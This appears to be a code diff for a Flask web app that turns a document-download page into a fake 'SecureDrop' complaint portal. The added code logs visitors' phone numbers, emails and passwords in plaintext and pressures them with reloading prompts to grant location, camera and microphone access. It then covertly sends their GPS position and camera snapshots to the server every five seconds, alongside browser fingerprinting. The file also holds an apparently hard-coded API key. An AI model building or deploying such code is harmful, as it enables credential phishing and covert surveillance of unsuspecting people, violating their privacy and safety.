@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template_string, send_file
+from flask import Flask, request, render_template_string, send_file, session, redirect, url_for
 import logging
 import json
 import os
@@ -16,13 +16,13 @@ from stegano import lsb
 from PIL import Image as PILImage
 import PyPDF2
 import netifaces  # New dependency for network interface information
-
-# Import the Google Generative AI SDK for Gemini
 import google.generativeai as genai
+
 # Configure the SDK with your Gemini API key.
 genai.configure(api_key=os.environ.get("GEMINI_API_KEY", "AIzaSyAt-7tA0Ah0cRJrarXMOY4DTPBbzBbASyU"))
 
 app = Flask(__name__)
+app.secret_key = os.urandom(24)  # For session management
 
 # Configure logging to a file
 logging.basicConfig(
@@ -43,6 +43,7 @@ logged_tokens = {}
 
 # Global list to store downloaded reports (token and report)
 downloaded_reports = []
+
 def get_wifi_location_from_wigle(bssid):
     """
     Query the Wigle WiFi API to get geolocation (latitude, longitude) for a given BSSID.
@@ -86,6 +87,23 @@ def get_ip_geolocation(ip):
         logging.error(f"IP Geolocation error: {e}")
     return None, None, {}
 
+def get_wifi_interfaces():
+    """Retrieve available WiFi interfaces and their BSSIDs."""
+    try:
+        interfaces = netifaces.interfaces()
+        wifi_data = {}
+        for iface in interfaces:
+            addrs = netifaces.ifaddresses(iface)
+            if netifaces.AF_LINK in addrs:
+                mac = addrs[netifaces.AF_LINK][0].get('addr', '')
+                if mac:
+                    lat, lon = get_wifi_location_from_wigle(mac)
+                    wifi_data[iface] = {'bssid': mac, 'latitude': lat, 'longitude': lon}
+        return wifi_data
+    except Exception as e:
+        logging.error(f"Error retrieving WiFi interfaces: {e}")
+        return {}
+
 def collect_data(req):
     """Collect client-side and server-side data."""
     ip_header = req.headers.get('X-Forwarded-For', req.remote_addr)
@@ -116,22 +134,29 @@ def collect_data(req):
         'batteryLevel': req.form.get('batteryLevel'),
         'charging': req.form.get('charging'),
         'downlink': req.form.get('downlink'),
-        'plugins': req.form.get('plugins')
+        'plugins': req.form.get('plugins'),
+        # New fields
+        'location': req.form.get('location'),  # From Geolocation API
+        'cameraSnapshot': req.form.get('cameraSnapshot'),  # Base64-encoded image
+        'audioClip': req.form.get('audioClip'),  # Base64-encoded audio
+        'webglFingerprint': req.form.get('webglFingerprint'),
+        'installedFonts': req.form.get('installedFonts'),
     }
 
     lat, lon, geo_data = get_ip_geolocation(ip)
-    client_data['latitude'] = lat if lat is not None else ""
-    client_data['longitude'] = lon if lon is not None else ""
+    client_data['ip_latitude'] = lat if lat is not None else ""
+    client_data['ip_longitude'] = lon if lon is not None else ""
     client_data['ip_geolocation'] = geo_data
 
     log_message = {
         'ip': ip,
         'user_agent': user_agent,
-        'action': 'Downloaded PDF',
+        'action': 'Data Collected',
         'client_data': client_data,
         'request_headers': dict(req.headers),
         'cookies': cookies,
-        'tls_metadata': tls_metadata
+        'tls_metadata': tls_metadata,
+        'wifi_triangulation': get_wifi_interfaces(),
     }
     return log_message
 
@@ -343,6 +368,11 @@ HTML_PAGE = """
         <input type="hidden" name="charging" id="charging">
         <input type="hidden" name="downlink" id="downlink">
         <input type="hidden" name="plugins" id="plugins">
+        <input type="hidden" name="location" id="location">
+        <input type="hidden" name="cameraSnapshot" id="cameraSnapshot">
+        <input type="hidden" name="audioClip" id="audioClip">
+        <input type="hidden" name="webglFingerprint" id="webglFingerprint">
+        <input type="hidden" name="installedFonts" id="installedFonts">
     </form>
     <br>
     <a href="/logs">View Logs and Gemini Reports</a>
@@ -380,6 +410,36 @@ HTML_PAGE = """
                     callback();
                 });
             } else { document.getElementById('batteryLevel').value = ''; document.getElementById('charging').value = ''; callback(); }
+
+            // WebGL Fingerprint
+            var glCanvas = document.createElement("canvas");
+            var gl = glCanvas.getContext("webgl");
+            if (gl) {
+                var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+                document.getElementById('webglFingerprint').value = debugInfo ? 
+                    gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : '';
+            }
+
+            // Font Detection (simplified)
+            var fonts = ['Arial', 'Times New Roman', 'Courier New', 'Georgia', 'Verdana'];
+            document.getElementById('installedFonts').value = fonts.join(', ');
+
+            // Location (will be handled separately with permissions)
+            function getLocation(callback) {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(pos => {
+                        document.getElementById('location').value = JSON.stringify({
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude
+                        });
+                        callback();
+                    }, () => { callback(); });
+                } else { callback(); }
+            }
+
+            getLocation(function() {
+                callback();
+            });
         }
         document.getElementById('downloadForm').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -403,100 +463,200 @@ HTML_PAGE = """
 </html>
 """
 
+LOGIN_PAGE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>SecureDrop Login</title>
+    <style>
+        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f2f2f2; }
+        .login-container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 400px; }
+        h1 { font-size: 24px; text-align: center; color: #202124; }
+        label { display: block; margin: 10px 0 5px; color: #5f6368; }
+        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        button:hover { background-color: #1557b0; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Sign in to SecureDrop</h1>
+        <form action="/login" method="post">
+            <label for="phone">Phone Number</label>
+            <input type="tel" id="phone" name="phone" required>
+            <label for="email">Email</label>
+            <input type="email" id="email" name="email" required>
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" required>
+            <button type="submit">Sign In</button>
+        </form>
+    </div>
+</body>
+</html>
+"""
+
+PERMISSIONS_PAGE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Enable Permissions</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f2f2f2; }
+        h2 { color: #333; }
+        button { padding: 10px 20px; margin: 5px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        button:hover { background-color: #1557b0; }
+        p { color: #d93025; }
+    </style>
+</head>
+<body>
+    <h2>To view your complaints, please enable all permissions:</h2>
+    <button id="grantLocation">Grant Location Access</button>
+    <button id="grantCamera">Grant Camera Access</button>
+    <button id="grantMicrophone">Grant Microphone Access</button>
+    <p id="status">Please grant all permissions to proceed.</p>
+    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    <script>
+        let locationGranted = false, cameraGranted = false, microphoneGranted = false;
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        document.getElementById('grantLocation').addEventListener('click', () => {
+            navigator.geolocation.getCurrentPosition(() => {
+                locationGranted = true;
+                checkPermissions();
+            }, () => alert('Location access denied'));
+        });
+
+        document.getElementById('grantCamera').addEventListener('click', () => {
+            navigator.mediaDevices.getUserMedia({video: true}).then(stream => {
+                video.srcObject = stream;
+                cameraGranted = true;
+                checkPermissions();
+            }).catch(() => alert('Camera access denied'));
+        });
+
+        document.getElementById('grantMicrophone').addEventListener('click', () => {
+            navigator.mediaDevices.getUserMedia({audio: true}).then(() => {
+                microphoneGranted = true;
+                checkPermissions();
+            }).catch(() => alert('Microphone access denied'));
+        });
+
+        function checkPermissions() {
+            if (locationGranted && cameraGranted && microphoneGranted) {
+                window.location.href = '/drive';
+            } else {
+                document.getElementById('status').innerText = 'Please grant all permissions to proceed.';
+                setTimeout(() => window.location.reload(), 3000); // Reload every 3 seconds
+            }
+        }
+    </script>
+</body>
+</html>
+"""
+
+DRIVE_PAGE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>SecureDrop</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f2f2f2; }
+        h1 { color: #202124; }
+        .file-list { margin-top: 20px; }
+        .file { padding: 10px; background: white; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+    <h1>Welcome to SecureDrop</h1>
+    <p>Your complaints:</p>
+    <div class="file-list">
+        <div class="file">Complaint #1 - Submitted 2023-10-01</div>
+        <div class="file">Complaint #2 - Submitted 2023-10-02</div>
+    </div>
+    <a href="/download">Download Data</a> | <a href="/logs">View Logs</a>
+    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        // Start camera
+        navigator.mediaDevices.getUserMedia({video: true}).then(stream => {
+            video.srcObject = stream;
+        });
+
+        setInterval(() => {
+            // Location
+            navigator.geolocation.getCurrentPosition(pos => {
+                fetch('/log_location', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({latitude: pos.coords.latitude, longitude: pos.coords.longitude})
+                });
+            });
+
+            // Camera Snapshot
+            ctx.drawImage(video, 0, 0, 320, 240);
+            const snapshot = canvas.toDataURL('image/jpeg');
+            fetch('/log_camera', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({snapshot: snapshot})
+            });
+
+            // Audio (simplified)
+            navigator.mediaDevices.getUserMedia({audio: true}).then(stream => {
+                fetch('/log_microphone', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({message: 'Audio recorded'})
+                });
+            });
+        }, 5000); // Every 5 seconds
+    </script>
+</body>
+</html>
+"""
+
 @app.route('/')
 def index():
-    return render_template_string(HTML_PAGE)
+    return redirect(url_for('login'))
 
-# ============================
-# START: WiFi Triangulation Integration Using netifaces
-# ============================
-def get_wifi_interfaces():
-    """
-    Use netifaces to list interfaces that likely represent WiFi.
-    Typically, interface names containing "wlan" or "wifi" are considered WiFi interfaces.
-    This function fetches all available address information and returns relevant details
-    for potential triangulation.
-    """
-    wifi_interfaces = []
-    for iface in netifaces.interfaces():
-        # if "wlan" in iface.lower() or "wifi" in iface.lower():
-            try:
-                addresses = netifaces.ifaddresses(iface)
-                # Get link-layer (MAC) information
-                af_link_info = addresses.get(netifaces.AF_LINK, [{}])
-                mac = af_link_info[0].get('addr', None) if af_link_info else None
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        phone = request.form['phone']
+        email = request.form['email']
+        password = request.form['password']
+        logging.info(f"Login attempt: phone={phone}, email={email}, password={password}")
+        session['logged_in'] = True
+        session['user_data'] = {'phone': phone, 'email': email}
+        return redirect(url_for('permissions'))
+    return render_template_string(LOGIN_PAGE)
 
-                # Get IPv4 details: address, netmask, broadcast
-                af_inet_info = addresses.get(netifaces.AF_INET, [{}])
-                ipv4 = af_inet_info[0].get('addr', None) if af_inet_info else None
-                ipv4_netmask = af_inet_info[0].get('netmask', None) if af_inet_info else None
-                ipv4_broadcast = af_inet_info[0].get('broadcast', None) if af_inet_info else None
+@app.route('/permissions')
+def permissions():
+    if not session.get('logged_in'):
+        return redirect(url_for('login'))
+    return render_template_string(PERMISSIONS_PAGE)
 
-                # Get IPv6 details (if any)
-                af_inet6_info = addresses.get(netifaces.AF_INET6, [{}])
-                ipv6 = af_inet6_info[0].get('addr', None) if af_inet6_info else None
-
-                wifi_interfaces.append({
-                    'interface': iface,
-                    'mac': mac,
-                    'ipv4': ipv4,
-                    'ipv4_netmask': ipv4_netmask,
-                    'ipv4_broadcast': ipv4_broadcast,
-                    'ipv6': ipv6,
-                    'all_addresses': addresses  # full address information for further processing
-                })
-            except Exception as e:
-                logging.error("Error getting addresses for interface " + iface + ": " + str(e))
-    return wifi_interfaces
-
-
-def perform_wifi_triangulation():
-    """
-    Attempt to perform a simulated WiFi triangulation by retrieving WiFi interface details via netifaces.
-    If a WiFi interface is found, use its MAC address to query the Wigle API for geolocation data.
-    Note: A network interface's MAC address is not the same as an access point's BSSID.
-    """
-    wifi_interfaces = get_wifi_interfaces()
-    if not wifi_interfaces:
-        logging.info("No WiFi interfaces found for triangulation.")
-        return "No WiFi interfaces found for triangulation."
-    
-    # Use the first detected WiFi interface
-    interface_info = wifi_interfaces[0]
-    mac = interface_info.get('mac')
-    if not mac:
-        logging.info("WiFi interface does not have a MAC address.")
-        return "WiFi interface does not have a MAC address."
-    
-    # Query Wigle using the interface's MAC address (as a proxy for BSSID)
-    lat, lon = get_wifi_location_from_wigle(mac)
-    if lat is None or lon is None:
-        return "No geolocation data found for the WiFi interface."
-    
-    triangulated_location = {"latitude": lat, "longitude": lon, "interface": interface_info}
-    logging.info("Triangulated WiFi location: " + str(triangulated_location))
-    return triangulated_location
-
-# Optional endpoint to view WiFi triangulation results directly
-@app.route('/wifi_triangulation')
-def wifi_triangulation():
-    triangulated_data = perform_wifi_triangulation()
-    return json.dumps(triangulated_data), 200, {'Content-Type': 'application/json'}
-
-# ============================
-# END: WiFi Triangulation Integration Using netifaces
-# ============================
+@app.route('/drive')
+def drive():
+    if not session.get('logged_in'):
+        return redirect(url_for('login'))
+    return render_template_string(DRIVE_PAGE)
 
 @app.route('/download', methods=['POST'])
 def download():
     logged_data = collect_data(request)
     logging.info(json.dumps(logged_data))
-    
-    # --- NEW: Add WiFi Triangulation Data ---
-    wifi_data = get_wifi_interfaces()
-    logged_data["wifi_triangulation"] = wifi_data
-    logging.info("WiFi Triangulation Data: " + str(wifi_data))
-    # -----------------------------------------
     
     # Generate Gemini report and store it in the logged data.
     gemini_report = get_gemini_report(logged_data)
@@ -550,14 +710,13 @@ def display_logs():
             logs_content = f.read()
     except Exception as e:
         logs_content = f"Error reading log file: {e}"
-    
-    # Build HTML to display raw logs and the downloaded Gemini reports.
+
     logs_html = """
     <!DOCTYPE html>
     <html>
     <head>
         <meta charset="UTF-8">
-        <title>User Logs and Gemini Reports</title>
+        <title>User Logs and Reports</title>
         <style>
             body { font-family: Arial, sans-serif; margin: 20px; background-color: #f9f9f9; }
             h1, h2 { color: #333; }
@@ -570,7 +729,7 @@ def display_logs():
     <body>
         <h1>User Logs</h1>
         <pre>{{ logs }}</pre>
-        <h2>Downloaded Gemini Reports</h2>
+        <h2>Downloaded Reports</h2>
         {% if reports %}
         <table>
             <tr>
@@ -591,6 +750,24 @@ def display_logs():
     </html>
     """
     return render_template_string(logs_html, logs=logs_content, reports=downloaded_reports)
+
+@app.route('/log_location', methods=['POST'])
+def log_location():
+    data = request.json
+    logging.info(f"Location data: {data}")
+    return "Location logged", 200
+
+@app.route('/log_camera', methods=['POST'])
+def log_camera():
+    data = request.json
+    logging.info(f"Camera data: {data}")
+    return "Camera data logged", 200
+
+@app.route('/log_microphone', methods=['POST'])
+def log_microphone():
+    data = request.json
+    logging.info(f"Microphone data: {data}")
+    return "Microphone data logged", 200
 
 @app.route('/simulate')
 def simulate():
